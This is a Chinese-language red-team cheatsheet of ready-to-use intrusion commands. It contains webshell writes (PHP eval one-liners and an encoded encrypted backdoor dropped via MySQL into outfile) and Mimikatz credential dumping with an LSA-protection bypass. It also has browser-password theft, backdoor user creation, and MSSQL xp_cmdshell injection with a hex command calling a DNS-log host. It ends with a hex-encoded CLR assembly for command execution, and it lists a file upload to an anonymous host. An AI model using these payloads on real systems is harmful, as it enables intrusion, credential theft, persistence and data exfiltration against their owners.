# command
收集渗透中会用到的常用命令  。


red team cheatsheets.       


建议直接[Ctrl+F]查找    

## java命令执行
如下编码网站：  
https://ares-x.com/tools/runtime-exec/    
https://r0yanx.com/tools/java_exec_encode/    
https://www.bugku.net/runtime-exec-payloads/   

手动编码操作  
```
bash -c {echo,cGluZyAxMjcuMC4wLjE7ZWNobyAxID50ZXN0LnR4dA==}|{base64,-d}|{bash,-i}
```

Windows下
```
getRuntime().exec(\"cmd /c echo 1 > D://tomcat//webapps//ROOT//90s.txt\");
```


绝对路径执行，解决环境变量的问题
```
C:\windows\system32\cmd.exe /c whoami

后台运行，但是cmd不能被关闭，不然也会退出
C:\windows\system32\cmd.exe /b agent.exe


/bin/sh -c whoami
/bin/bash -c whoami
```


## 命令执行，定位资源文件写文件回显
Linux
```
find /|grep index.js|while read f;do sh -c "whoami" >$(dirname $f)/test.txt;done
```
Windows(注意盘符)
```
for /r D:\ %i in (index.js*) do whoami > %i/../test.txt

```

## 写shell
在windows中，批处理需要转义字符主要有 “&”，“|”，“<”，“>”等等，转义字符为”^”  
在Linux中，需要转义字符主要是 单引号 或者双引号 对于单引号，我们将其替换为\47即可。  
windows命令行最大长度为8191,16进制长度是113898。echo写文件时注意长度。  

方法1
```
set /p=qaxnb<nul>d:\1d13.txt
```
方法2
```
echo qaxnb>1we.txt
```
追加内容
```
echo qaxnb>>1we.txt
```
不换行追加
```
set /p="121d2">>a.txt
```
规避空格
```
echo.123>>a.txt
echo,123>>a.txt
type;a.txt
```
powershell写文件
```
powershell -c "'a' | Out-File C:\1.txt -Append -NoNewline"
```

写特殊字符很多的文件，可以用certutil编码再还原。
```
hex
certutil -encodehex 111.jsp 111.txt

base64
certutil -encode 111.jsp 111.txt

mac命令行快速转换hex
xxd -ps -u Everything.exe | tr -d '\n' >ou.txt
```

如下还原
```
certutil -f -decode 111.txt C:\\111.jsp
certutil -decodehex 111.txt C:\\111.jsp

看hash
certutil -hashfile a.exe MD5
```
linux下base64
```
echo PD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk7Pz4=|base64 -d > /var/www/html/shell.php
```
php的
```
echo \<\?php eval\(\@\$_POST\[1\]\)\; \?\> >1.php
```
绕过空格
```
> < <> 重定向符
%09(需要php环境)
${IFS}
$IFS$9
{cat,flag.php}
%20
%09
```

windows特性执行命令
```
who''ami
```

## 文件搜索
https://www.anquanke.com/post/id/245019

```
findstr /s /i /n /d:C:\ /c:"123123" *.txt
```

```
for /r C: %i in (login.*) do @echo %i
```

```
where /R C: login.*
```

```
dir /s/a-d/b login.*
```

```
find / -name index.php
```

```
find / -name index.php
```

```
find / -name "index.php" | xargs grep "111222"
```

```
updatedb && locate index.php
```

进程路径
```

wmic process get name,executablepath
```


windows打包目录

```
powershell -Command "Compress-Archive -Path E:\update\ -DestinationPath E:\test.zip"
```

程序名找启动路径
```
wmic process where name='mysqld.exe' get processid,executablepath,name
```
程序pid找路径
```
wmic process get name,executablepath,processid|findstr pid
```

启动路径找login.jsp
```
for /f %i in ('dir /s /b D:\UFGOV\U8\login.jsp') do (echo %i)
```

base64分段不换行追加写文件
```
echo|set /p=\"PCFET0NUWVBFIGh0bWw+IDxodG1sPiA8aGVhZD4gPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgiIC8+PGgxPjIwMjHlubR4eHjnvZHnu5zlronlhajlrp7miJjmvJTnu4M8L2gxPg==\" > D:\UFGOV\U8\webapps\demonstrate.txt
```

解决cmd无回显问题
```
powershell Get-ChildItem C:
```


### grep搜索

```
grep -E "([0-9]{1,3}[\.]){3}[0-9]{1,3}" -r xxx --color=auto
```

```
grep -E "https?://[a-zA-Z0-9\.\/_&=@$%?~#-]*" -r xxx --color=auto
```

```
grep -EHirn "accesskey|admin|aes|api_key|apikey|checkClientTrusted|crypt|http:|https:|password|pinning|secret|SHA256|SharedPreferences|superuser|token|X509TrustManager|insert into" APKfolder/
```

```
grep -ohr -E "https?://[a-zA-Z0-9\.\/_&=@$%?~#-]*" /app/ |sort|uniq >> test.txt
```

web应用
```
grep -EHirn '--include=*.'{java,jsp,jspx,xml,conf,json,ini,properties,yaml,toml,plist,txt,sql} "accesskey|api_key|apikey|jdbc|username|pass|passwd|password" webapps/
```

搜索文件内的字符串
```
grep -r "test" ./src

显示行号
grep -rn "test" ./src
```


## 匿名文件存储
可用命令行   
https://transfer.sh/
使用很简单   
```
上传，成功后返回随机路径
curl --upload-file ./hello.txt https://transfer.sh/hello.txt

获取
https://transfer.sh/fF6OA7aF8o/hello.txt

```

日常使用
https://gofile.io/


## nbtscan

```
nbtscan.exe 10.11.1.0/24
```

## dos命令存活主机探测
```
for /L %I in (1,1,256) DO @ping -w 1 -l 1 192.168.202.%I | findstr "TTL="
```


## nmap

只执行 ping 扫描。它不会进行任何端口扫描或服务/版本检测
```
nmap -sn 10.11.1.0/24
```

SYN扫描，不ping
```
sudo nmap -sS -Pn 192.168.10.1/24
```

udp发包探测存活，比较慢
```
sudo nmap -sU -Pn 10.11.1.0/24
```
tcp端口
```
nmap -sT -Pn 10.11.1.1 -p 22
```

操作系统识别，代理推荐用proxychains，并且指定端口，不然会扫top1000
```
proxychains nmap -Pn -O -sT -v -p 22 -sV 192.168.2.1
```

多种方式，进行存活探测(TCP ACK、TCP FIN 和 UDP 数据包来探测主机)
```
sudo nmap -PA -Pn 192.168.10.1/24
```

扫描版本，全端口
```
nmap -sV -p- 10.11.1.0
```

```
nmap 10.11.1.0 --script vuln
```

```
nmap -p445 10.11.1.0 --script smb-vuln-ms17-010
```

```
nmap -v -sn -PE -n --min-hostgroup 1024 --min-parallelism 1024 -oG tmp -iL ip.txt | awk '{print $5}' | grep -v "latency)." >ok_ip.txt
```

nmap 极速扫描，快如闪电
```
nmap -n --unique --resolve-all -Pn --min-hostgroup 64 --max-retries 0 --host-timeout 10m --script-timeout 3m -oX {filename} --version-intensity 9 --min-rate 10000 -T4 192.168.23.1
nmap -n --resolve-all -Pn --min-hostgroup 64 --max-retries 0 --host-timeout 10m --script-timeout 3m -oX {filename} --version-intensity 9 --min-rate 10000 -T4 192.168.23.1
```

获取http title
```
nmap -n --resolve-all -Pn --min-hostgroup  --max-retries 3 --host-timeout 10m --script-timeout 3m --version-intensity 9 --min-rate 10000 --script=http-title -T4 -p- -iL domain.txt
```

## masscan 
注意速率问题,根据带宽调整。100m带宽可调3000,注意是vps，不是家庭宽带。   

关于编译，直接git拉下来，make就行。生成的文件在bin下面。   
扫描单ip   
```
masscan 192.168.1.110 -p 1-65535 --rate=1000
```
扫描列表
```
masscan -iL ip.txt -p1-65535 --rate=1000 -oL port.txt
```

解析,提取ip:port
```
cat port.txt |awk '{print $4":"$3}'
```
转换为nmap可用端口
```
cat p.txt | tr "\n" ,
```




## 端口列表

内网端口
```
21,22,2222,445,135,3389,3306,1433,6379,7001,80,88,81,7000,8000,8080,8088,9090,443,8443,5000,5003,5555,7680,9000,9200,27017,2379
```

常见端口

```
22,23,135,445,389,3389,80,443,8080,7001,3306,1433,1521,6379,27017,2375,5900,5432,4899

21-23,80-90,135,137,161,389,443,445,873,1099,1433,1521,1900,2082,2083,2222,2375,2376,2601,2604,3128,3306,3311,3312,3389,4440,4848,5001,5432,5560,5900-5902,6082,6379,7001-7010,7778,8009,8080-8090,8649,8888,9000,9200,10000,11211,27017,28017,50000,51111,50030,50060

20-26,30,32-33,37,42-43,49,53,70,79-85,88-90,99-100,106,109-111,113,119,125,135,139,143-144,146,161,163,179,199,211-212,222,254-256,259,264,280,301,306,311,340,366,389,406-407,416-417,425,427,443-445,458,464-465,481,497,500,512-515,524,541,543-545,548,554-555,563,587,593,616-617,625,631,636,646,648,666-668,683,687,691,700,705,711,714,720,722,726,749,765,777,783,787,800-801,808,843,873,880,888,898,900-903,911-912,981,987,990,992-993,995,999-1002,1007,1009-1011,1021-1100,1102,1104-1108,1110-1114,1117,1119,1121-1124,1126,1130-1132,1137-1138,1141,1145,1147-1149,1151-1152,1154,1163-1166,1169,1174-1175,1183,1185-1187,1192,1198-1199,1201,1213,1216-1218,1233-1234,1236,1244,1247-1248,1259,1271-1272,1277,1287,1296,1300-1301,1309-1311,1322,1328,1334,1352,1417,1433-1434,1443,1455,1461,1494,1500-1501,1503,1521,1524,1533,1556,1580,1583,1594,1600,1641,1658,1666,1687-1688,1700,1717-1721,1723,1755,1761,1782-1783,1801,1805,1812,1839-1840,1862-1864,1875,1900,1914,1935,1947,1971-1972,1974,1984,1998-2010,2013,2020-2022,2030,2033-2035,2038,2040-2043,2045-2049,2065,2068,2099-2100,2103,2105-2107,2111,2119,2121,2126,2135,2144,2160-2161,2170,2179,2190-2191,2196,2200,2222,2251,2260,2288,2301,2323,2366,2381-2383,2393-2394,2399,2401,2492,2500,2522,2525,2557,2601-2602,2604-2605,2607-2608,2638,2701-2702,2710,2717-2718,2725,2800,2809,2811,2869,2875,2909-2910,2920,2967-2968,2998,3000-3001,3003,3005-3007,3011,3013,3017,3030-3031,3052,3071,3077,3128,3168,3211,3221,3260-3261,3268-3269,3283,3300-3301,3306,3322-3325,3333,3351,3367,3369-3372,3389-3390,3404,3476,3493,3517,3527,3546,3551,3580,3659,3689-3690,3703,3737,3766,3784,3800-3801,3809,3814,3826-3828,3851,3869,3871,3878,3880,3889,3905,3914,3918,3920,3945,3971,3986,3995,3998,4000-4006,4045,4111,4125-4126,4129,4224,4242,4279,4321,4343,4443-4446,4449,4550,4567,4662,4848,4899-4900,4998,5000-5004,5009,5030,5033,5050-5051,5054,5060-5061,5080,5087,5100-5102,5120,5190,5200,5214,5221-5222,5225-5226,5269,5280,5298,5357,5405,5414,5431-5432,5440,5500,5510,5544,5550,5555,5560,5566,5631,5633,5666,5678-5679,5718,5730,5800-5802,5810-5811,5815,5822,5825,5850,5859,5862,5877,5900-5904,5906-5907,5910-5911,5915,5922,5925,5950,5952,5959-5963,5987-5989,5998-6007,6009,6025,6059,6100-6101,6106,6112,6123,6129,6156,6346,6389,6502,6510,6543,6547,6565-6567,6580,6646,6666-6669,6689,6692,6699,6779,6788-6789,6792,6839,6881,6901,6969,7000-7002,7004,7007,7019,7025,7070,7100,7103,7106,7200-7201,7402,7435,7443,7496,7512,7625,7627,7676,7741,7777-7778,7800,7911,7920-7921,7937-7938,7999-8002,8007-8011,8021-8022,8031,8042,8045,8080-8090,8093,8099-8100,8180-8181,8192-8194,8200,8222,8254,8290-8292,8300,8333,8383,8400,8402,8443,8500,8600,8649,8651-8652,8654,8701,8800,8873,8888,8899,8994,9000-9003,9009-9011,9040,9050,9071,9080-9081,9090-9091,9099-9103,9110-9111,9200,9207,9220,9290,9415,9418,9485,9500,9502-9503,9535,9575,9593-9595,9618,9666,9876-9878,9898,9900,9917,9929,9943-9944,9968,9998-10004,10009-10010,10012,10024-10025,10082,10180,10215,10243,10566,10616-10617,10621,10626,10628-10629,10778,11110-11111,11967,12000,12174,12265,12345,13456,13722,13782-13783,14000,14238,14441-14442,15000,15002-15004,15660,15742,16000-16001,16012,16016,16018,16080,16113,16992-16993,17877,17988,18040,18101,18988,19101,19283,19315,19350,19780,19801,19842,20000,20005,20031,20221-20222,20828,21571,22939,23502,24444,24800,25734-25735,26214,27000,27352-27353,27355-27356,27715,28201,30000,30718,30951,31038,31337,32768-32785,33354,33899,34571-34573,35500,38292,40193,40911,41511,42510,44176,44442-44443,44501,45100,48080,49152-49161,49163,49165,49167,49175-49176,49400,49999-50003,50006,50050,50300,50389,50500,50636,50800,51111,51103,51493,52673,52822,52848,52869,54045,54328,55055-55056,55555,55600,56737-56738,57294,57797,58080,60020,60443,61532,61900,62078,63331,64623,64680,65000,65129,65389

```

## 字典

<details>
<summary>top200</summary>

```
123456
password
123456789
12345678
12345
qwerty
123123
111111
abc123
1234567
dragon
1q2w3e4r
sunshine
654321
master
1234
football
1234567890
000000
computer
666666
superman
michael
internet
iloveyou
daniel
1qaz2wsx
monkey
shadow
jessica
letmein
baseball
whatever
princess
abcd1234
123321
starwars
121212
thomas
zxcvbnm
trustno1
killer
welcome
jordan
aaaaaa
123qwe
freedom
password1
charlie
batman
jennifer
7777777
michelle
diamond
oliver
mercedes
benjamin
11111111
snoopy
samantha
victoria
matrix
george
alexander
secret
cookie
asdfgh
987654321
123abc
orange
fuckyou
asdf1234
pepper
hunter
silver
joshua
banana
1q2w3e
chelsea
1234qwer
summer
qwertyuiop
phoenix
andrew
q1w2e3r4
elephant
rainbow
mustang
merlin
london
garfield
robert
chocolate
112233
samsung
qazwsx
matthew
buster
jonathan
ginger
flower
555555
test
caroline
amanda
maverick
midnight
martin
junior
88888888
anthony
jasmine
creative
patrick
mickey
123
qwerty123
cocacola
chicken
passw0rd
forever
william
nicole
hello
yellow
nirvana
justin
friends
cheese
tigger
mother
liverpool
blink182
asdfghjkl
andrea
spider
scooter
richard
soccer
rachel
purple
morgan
melissa
jackson
arsenal
222222
qwe123
gabriel
ferrari
jasper
danielle
bandit
angela
scorpion
prince
maggie
austin
veronica
nicholas
monster
dexter
carlos
thunder
success
hannah
ashley
131313
stella
brandon
pokemon
joseph
asdfasdf
999999
metallica
december
chester
taylor
sophie
samuel
rabbit
crystal
barney
xxxxxx
steven
ranger
patricia
christian
asshole
spiderman
sandra
hockey
angels
security
parker
heather
888888
victor
harley
333333
system
slipknot
november
jordan23
canada
tennis
qwertyui
casper
```

</details>

## 密码抓取
### Mimikatz抓Windows

https://github.com/gentilkiwi/mimikatz/releases     
dump工具      
https://docs.microsoft.com/en-us/sysinternals/downloads/procdump        

一条命令
```

mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords full" "exit"
```
控制台执行多条命令，用log防止进程崩溃，数据丢失
```
mimikatz # privilege::debug
mimikatz # log
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::wdigest
```
msf中执行命令
```
mimikatz_command -f sekurlsa::logonPasswords full
mimikatz_command -f sekurlsa::wdigest
```
注册表开启wdigest,08r2后默认关闭。需要目标注销，重新登录。2016需要重启。
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /f /d 1


```

从内存获取
```
 procdump64.exe -accepteula -ma lsass.exe lsass.dmp 
```


 获取到 lsass.dmp文件后可以用
```
 mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit
```

#### bypass lsa Protection(ppl)


查询是否启用LSA，开启后，上面的方法就无法正常抓密码，此时用如下方法。
```
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa
```
把mimidriver.sys拷贝到同级目录，进行加载bypass
```
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # privilege::debug    
mimikatz # token::elevate
mimikatz # sekurlsa::logonpasswords
mimikatz # !processprotect /process:lsass.exe
mimikatz # !-
```


### 浏览器密码
https://github.com/moonD4rk/HackBrowserData/releases/tag/v0.4.6

```
结果输出在results中

.\hack-browser-data.exe -b all -f json --dir results --zip
```


## cs凭证解析

提取用户名
```
awk -F":::" '{print $1}' credentials.txt | awk -F"\\" '{print $2}'
```
提取hash
```
awk -F":::" '{print $2}' credentials.txt
```



## gobuster

```
gobuster dir -u https://buffered.io -w ~/wordlists/shortlist.txt
```

## dirsearch

```
python3 dirsearch.py -e php,html,js -u https://target
```

```
python3 dirsearch.py -e php,html,js -u https://target -w /path/to/wordlist
```

扫目录
```
python3 dirsearch.py -e php,html,js -u https://target -w /path/to/wordlist --remove-extensions
```

```
python3 dirsearch.py -e php,htm,js,bak,zip,tgz,txt -u https://target -t 20
```

```
python3 dirsearch.py -e php,html,js -u https://target --proxy 127.0.0.1:8080
```

```
python3 dirsearch.py -e php,html,js -u https://target --proxy socks5://10.10.0.1:8080
```

从文件读取批量扫描
```
python3 dirsearch.py -l all_site.txt -o result.txt
```

## 代理工具
proxychain
sockscap64    
proxifier   
ccproxy
sockscap

https://drive.google.com/drive/folders/1x5naJeK2YkV6QCYUlUg5QNMl1Izf4-ti   
https://www.mediafire.com/folder/32rj1769a2w82/v4.7   


## 内网穿透工具

### fuso

- https://github.com/editso/fuso.git   
- 相对冷门，不会被杀
在9004上开启socks5代理  
```
fuc.exe 159.138.0.0 9003 -h 127.0.0.1 -p 9004 -b 9004 -n test -t socks5 --bridge-host 0.0.0.0 --bridge-port 9004
```

### frp

### nps
https://github.com/ehang-io/nps     

```
 sudo ./nps install
 sudo nps start
```
安装后配置文件位置/etc/nps，默认密码(可在配置文件里面修改)admin/123  

### iox

### Stowaway
https://github.com/lz520520/Stowaway

### Venom
https://github.com/Dliv3/Venom


## 内网远程控制工具

图形化界面比较好操作一点，还可以直接关杀软。

### rustdesk
老版本便携版，可以直接编辑配置文件，填入明文密码。新版本，可以自己本地生成好，传上去。
```
配置文件位置
C:\Users\administrator\AppData\Roaming\RustDesk\config
```

### gotohttp
无敌，就是需要能出网，直接网页控制
https://gotohttp.com/
运行后，当前目录就会生成配置文件，里面包含明文的id和密码，然后打开网页直接连接。


### todesk
便携版
tempAuthPassEx是连接密码，本地生产，替换。重启生效
```
便携版
C:\ProgramData\ToDesk_Lite\config.ini
安装版
C:\Program Files\ToDesk\config.ini
```


### AnyDesk
本地生成配置后，传输上去替换。没临时密码，需要设置一个固定密码再传上去。
```
C:\Users\administrator\AppData\Roaming\AnyDesk
```

### TeamViewer
老版本11-15，直接解密
https://github.com/uknowsec/SharpDecryptPwd


### sunlogin向日葵
配置文件中的，密码可以解密。也有便携版。
```
C:\Program Files\Oray\SunLogin\SunloginClient\config.ini [默认路径]
```


其他，也可以用各个厂商的云助手来控制。成本有点高，但是免杀效果好。看个人需求选择。


## ssh无记录shell


```
 ssh -T root@192.168.1.1 /usr/bin/bash -i
```



## ssh无交互添加用户

```
useradd newuser;echo "newuser:password"|chpasswd
```

```
useradd -p `openssl passwd 123456` guest
```

```
useradd -p "$(openssl passwd 123456)" guest
```

```
useradd newuwer;echo -e "123456\n123456\n" |passwd newuser
```



## sqlmap

```
python sqlmap.py -u "http://www.vuln.cn/post.php?id=1" --proxy "http://127.0.0.1:1080"
```

```
python sqlmap.py  -u "http://www.vuln.cn" –cookie "id=11" --level 2
```

```
python sqlmap.py -u "www.xxxx.com/product/detail/id/3*.html" --dbms=mysql -v 3 
```

```
python sqlmap.py -u "http://www.vuln.cn/post.php?id=1"  --dbms mysql  --dbs
```

```
python sqlmap.py -u "http://www.vuln.cn/post.php?id=*"  --dbms mysql  --dbs
```

```
python sqlmap.py -u "http://www.vuln.cn/post.php?id=1"  --dbms mysql  -D test --tables
```

```
python sqlmap.py -u "http://www.vuln.cn/post.php?id=1"  --dbms mysql  -D test -T admin –-columns
```

```
python sqlmap.py -u "http://www.vuln.cn/post.php?id=1"  --dbms mysql -D test -T admin -C "username,password" --dump
```

```
python sqlmap.py -r "c:\request.txt" -p id –dbms mysql –file-read="e:\www\as\config.php"
```

自写tamper调试
```
python sqlmap.py -u "http://www.vuln.cn/post.php?id=1&pwd=11;*&page=1&clientip=1" --dbms mssql --proxy "http://192.168.2.144:8443" --tamper=custom_key_tamper -v 3 --batch --random-agent
```


## mysql注入

开远程

```
use mysql;  
update user set host = '%' where user = 'root';  
FLUSH PRIVILEGES ;  
select host, user from user;
 mysql -uroot -p -e "select * from mysql.user;" >1.txt
```

不登录直接执行sql
```
mysql -uaHmin -proot test -e "select now()" -N >H:/work/target1.txt
mysql -uroot -e "show databases;" >1.txt
```

mysql getshell

```
show variables like '%secure%'    
select '<?php eval($_POST[xxx]) ?>' into outfile '/var/www/xx.php';  
select '<?php eval($_POST[xx]) ?>' into dumpfile '/var/www/xx.php';  
```

```
set global general_log=on;  
set global general_log_file='/var/www/1.php';  
select '<?php eval($_POST[s6]) ?>';
```

```
select '<?php file_put_contents("abab.php",base64_decode("Jmx0Oz9waHANCkBlcnJvcl9yZXBvcnRpbmcoMCk7DQpzZXNzaW9uX3N0YXJ0KCk7DQogICAgJGtleT0iZTQ1ZTMyOWZlYjVkOTI1YiI7IA0KCSRfU0VTU0lPTlsmIzM5O2smIzM5O109JGtleTsNCgkkcG9zdD1maWxlX2dldF9jb250ZW50cygicGhwOi8vaW5wdXQiKTsNCglpZighZXh0ZW5zaW9uX2xvYWRlZCgmIzM5O29wZW5zc2wmIzM5OykpDQoJew0KCQkkdD0iYmFzZTY0XyIuImRlY29kZSI7DQoJCSRwb3N0PSR0KCRwb3N0LiIiKTsNCgkJDQoJCWZvcigkaT0wOyRpJmx0O3N0cmxlbigkcG9zdCk7JGkrKykgew0KICAgIAkJCSAkcG9zdFskaV0gPSAkcG9zdFskaV1eJGtleVskaSsxJjE1XTsgDQogICAgCQkJfQ0KCX0NCgllbHNlDQoJew0KCQkkcG9zdD1vcGVuc3NsX2RlY3J5cHQoJHBvc3QsICJBRVMxMjgiLCAka2V5KTsNCgl9DQogICAgJGFycj1leHBsb2RlKCYjMzk7fCYjMzk7LCRwb3N0KTsNCiAgICAkZnVuYz0kYXJyWzBdOw0KICAgICRwYXJhbXM9JGFyclsxXTsNCgljbGFzcyBDe3B1YmxpYyBmdW5jdGlvbiBfX2ludm9rZSgkcCkge2V2YWwoJHAuIiIpO319DQogICAgQGNhbGxfdXNlcl9mdW5jKG5ldyBDKCksJHBhcmFtcyk7DQo/Jmd0Ow0K"));?>' into outfile 'C:/wamp/www/abb.php';

```




## mssql注入

堆叠注入，xpcmdshell
```
http://www.vuln.cn/post.php?id=11;DECLARE/**/@ljbd/**/VARCHAR(8000);SET/**/@ljbd=0x70696e67202d6e6320312077772e36373332396163312e646e732e313433332e65752e6f7267;EXEC/**/master..xp_cmdshell/**/@ljbd--
```

写clr 需要提前把dll转为hex，分批写入
```
>>"c:\windows\tasks\clrdatabase.dll.tmp" set /p="000000001b300b00300000"<nul
```

完整clr写入命令如下
```
DECLARE @bjxl VARCHAR(8000);SET @bjxl=0x3e3e22633a5c6e756c;EXEC master..xp_cmdshell @bjxl
```
写完后加载clr，创建函数执行
```
CREATE ASSEMBLY MyClrFunctions
FROM 'C:\Path\To\MyClrFunctions.dll'
WITH PERMISSION_SET = SAFE;

```

也可以一次性导入，缺点是太大
```
CREATE ASSEMBLY [mssql_CLR]
  AUTHORIZATION [dbo]
  FROM 0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000504500004C010300660705620000000000000000E00022200B013000000E00000006000000000000522C0000002000000040000000000010002000000002000004000000000000000400000000000000008000000002000000000000030040850000100000100000000010000010000000000000100000000000000000000000002C00004F00000000400000A802000000000000000000000000000000000000006000000C000000C82A00001C0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000080000000000000000000000082000004800000000000000000000002E74657874000000580C000000200000000E000000020000000000000000000000000000200000602E72737263000000A8020000004000000004000000100000000000000000000000000000400000402E72656C6F6300000C0000000060000000020000001400000000000000000000000000004000004200000000000000000000000000000000342C00000000000048000000020005007C2200004C0800000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000CA00280600000A72010000706F0700000A00280600000A7243000070725300007002280800000A28020000066F0700000A002A001B300600BC0100000100001173040000060A00730900000A0B076F0A00000A026F0B00000A0003280C00000A16FE010D092C0F00076F0A00000A036F0D00000A0000076F0A00000A176F0E00000A00076F0A00000A176F0F00000A00076F0A00000A166F1000000A00076F0A00000A176F1100000A00076F0A00000A176F1200000A0006731300000A7D010000040706FE0605000006731400000A6F1500000A00140C00076F1600000A26076F1700000A00076F1800000A6F1900000A0C076F1A00000A0000DE18130400280600000A11046F1B00000A6F0700000A0000DE00076F1C00000A16FE01130511052C1D00280600000A067B010000046F1D00000A6F0700000A000038AA00000000731300000A130608280C00000A16FE01130711072C0B001106086F1E00000A2600067B010000046F1F00000A16FE03130811082C22001106725D0000706F1E00000A261106067B010000046F1D00000A6F1E00000A2600280600000A1C8D0E000001251602A2251703A225187275000070A22519076F1C00000A13091209282000000AA2251A72AD000070A2251B1106252D0426142B056F1D00000AA2282100000A6F0700000A0000067B010000046F1D00000A130A2B00110A2A011000000000970025BC0018080000012202282200000A002A4E027B01000004046F2300000A6F1E00000A262A00000042534A4201000100000000000C00000076342E302E33303331390000000005006C000000A8020000237E000014030000B403000023537472696E677300000000C8060000B4000000235553007C0700001000000023475549440000008C070000C000000023426C6F620000000000000002000001571502000902000000FA0133001600000100000014000000030000000100000005000000050000002300000005000000010000000100000003000000010000000000D60101000000000006007001BA0206009001BA0206004601A7020F00DA02000006003C03E4010A005A015A020E001503A7020600EB01E40106002C027A0306002B01BA020E00FA02A7020A0086035A020A0023015A020600C401E4010E000302A7020E00D200A7020E004102A70206001402360006002102360006002700E401000000002D00000000000100010001001000E9020000150001000100030110000100000015000100040006007003790050200000000096008D007D000100842000000000960099001A0002005C22000000008618A102060004005C22000000008618A102060004006522000000008300160082000400000001007F0000000100F200000002002B03000001003A020000020010030900A10201001100A10206001900A1020A003100A10206005100A102060061001A0110006900A4001500710035031A003900A10206003900F50132007900E50015007100A403370079001D031500790091033C007900C20041007900AE013C00790087023C00790055033C004900A10206008900A1024700390068004D0039004F0353003900FB000600390075025700990083005C003900430306004100B6005C003900A90060002900C2015C0049000F0164004900CB016000A100C2015C00710035036A002900A1020600590056005C0020002300BA002E000B0089002E00130092002E001B00B10063002B00BA0020000480000000000000000000000000000000004000000004000000000000000000000070005F000000000004000000000000000000000070004A00000000000400000000000000000000007000E40100000000030002000000003C3E635F5F446973706C6179436C617373315F30003C52756E436F6D6D616E643E625F5F3000496E743332003C4D6F64756C653E0053797374656D2E494F006D7373716C5F434C520053797374656D2E44617461006765745F44617461006D73636F726C6962006164645F4F757470757444617461526563656976656400636D640052656164546F456E640045786563436F6D6D616E640052756E436F6D6D616E640053656E64006765745F45786974436F6465006765745F4D657373616765007365745F57696E646F775374796C650050726F6365737357696E646F775374796C65007365745F46696C654E616D650066696C656E616D6500426567696E4F7574707574526561644C696E6500417070656E644C696E65006765745F506970650053716C5069706500436F6D70696C657247656E6572617465644174747269627574650044656275676761626C654174747269627574650053716C50726F63656475726541747472696275746500436F6D70696C6174696F6E52656C61786174696F6E734174747269627574650052756E74696D65436F6D7061746962696C697479417474726962757465007365745F5573655368656C6C4578656375746500546F537472696E67006765745F4C656E677468006D7373716C5F434C522E646C6C0053797374656D00457863657074696F6E006765745F5374617274496E666F0050726F636573735374617274496E666F0053747265616D526561646572005465787452656164657200537472696E674275696C6465720073656E646572004461746152656365697665644576656E7448616E646C6572004D6963726F736F66742E53716C5365727665722E536572766572006765745F5374616E646172644572726F72007365745F52656469726563745374616E646172644572726F72002E63746F720053797374656D2E446961676E6F73746963730053797374656D2E52756E74696D652E436F6D70696C6572536572766963657300446562756767696E674D6F6465730053746F72656450726F63656475726573004461746152656365697665644576656E744172677300617267730050726F63657373007365745F417267756D656E747300617267756D656E747300436F6E636174004F626A6563740057616974466F7245786974005374617274007365745F52656469726563745374616E646172644F7574707574007374644F75747075740053797374656D2E546578740053716C436F6E74657874007365745F4372656174654E6F57696E646F770049734E756C6C4F72456D707479000000004143006F006D006D0061006E0064002000690073002000720075006E006E0069006E0067002C00200070006C006500610073006500200077006100690074002E00000F63006D0064002E00650078006500000920002F0063002000001753007400640020006F00750074007000750074003A0000372000660069006E00690073006800650064002000770069007400680020006500780069007400200063006F006400650020003D00200000053A00200000005E54E0227F5F5E409B9302C5EA5F62E7000420010108032000010520010111110400001235042001010E0500020E0E0E11070B120C121D0E0212210212250202080E042000123D040001020E0420010102052001011141052002011C180520010112450320000204200012490320000E0320000805200112250E0500010E1D0E08B77A5C561934E08903061225040001010E062002011C122D0801000800000000001E01000100540216577261704E6F6E457863657074696F6E5468726F777301080100070100000000040100000000000000006607056200000000020000001C010000E42A0000E40C000052534453F12CF9670467FE4789AA4C0BB3C9132401000000433A5C55736572735C546573745C736F757263655C7265706F735C6D7373716C5F434C525C6D7373716C5F434C525C6F626A5C44656275675C6D7373716C5F434C522E70646200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000282C00000000000000000000422C0000002000000000000000000000000000000000000000000000342C0000000000000000000000005F436F72446C6C4D61696E006D73636F7265652E646C6C0000000000FF250020001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001001000000018000080000000000000000000000000000001000100000030000080000000000000000000000000000001000000000048000000584000004C02000000000000000000004C0234000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100000000000000000000000000000000003F000000000000000400000002000000000000000000000000000000440000000100560061007200460069006C00650049006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000000000B004AC010000010053007400720069006E006700460069006C00650049006E0066006F0000008801000001003000300030003000300034006200300000002C0002000100460069006C0065004400650073006300720069007000740069006F006E000000000020000000300008000100460069006C006500560065007200730069006F006E000000000030002E0030002E0030002E00300000003C000E00010049006E007400650072006E0061006C004E0061006D00650000006D007300730071006C005F0043004C005200